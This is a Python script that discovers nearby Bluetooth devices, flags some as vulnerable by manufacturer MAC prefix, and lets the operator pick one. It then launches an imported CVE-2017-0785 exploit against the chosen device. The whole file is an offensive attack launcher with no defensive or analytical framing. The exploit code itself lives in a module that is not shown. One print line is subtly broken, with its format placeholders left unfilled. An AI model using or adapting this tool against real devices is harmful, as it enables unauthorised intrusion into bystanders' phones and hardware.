import time
import bluetooth
import vulndevices
import cve20170785

deviceMACs = vulndevices.get_devices()

class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    ORANGE = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def is_device_vulnerable(addr):
    for manufacturer, macs in deviceMACs.items():
        if addr[:8] in macs:
            return manufacturer
    return None

def main():
    print("searching for devices\n")
    results = bluetooth.discover_devices(duration=20, lookup_names=True)
    vuln_devices = []
    if (results):
        for addr, name in results:
            vulnerable = is_device_vulnerable(addr)
            if vulnerable:
                vuln_devices.append((addr,name))
                print("%s %s is " % (addr, name) + bcolors.RED + "vulnerable" + bcolors.ENDC)
            else:
                print("%s %s is" + bcolors.GREEN + "patched" + bcolors.ENDC)
    
    if len(vuln_devices) > 0:
        print(bcolors.ORANGE + "\nExploit" + bcolors.ENDC + "\n" + "-"*35)
        for idx, dev in enumerate(vuln_devices):
            print("[%s] %s %s" % (idx, dev[0], dev[1]))
        selection = input(bcolors.GREEN + "\nchoice: " + bcolors.ENDC)
        try:
            sel = int(selection)
            addr = vuln_devices[sel][0]
            cve20170785.exploit(addr)

        except:
            print("Invalid selection")
    else:
        print(bcolors.GREEN + "No vulnerable devices found!" + bcolors.ENDC)


if __name__=="__main__":
    main()
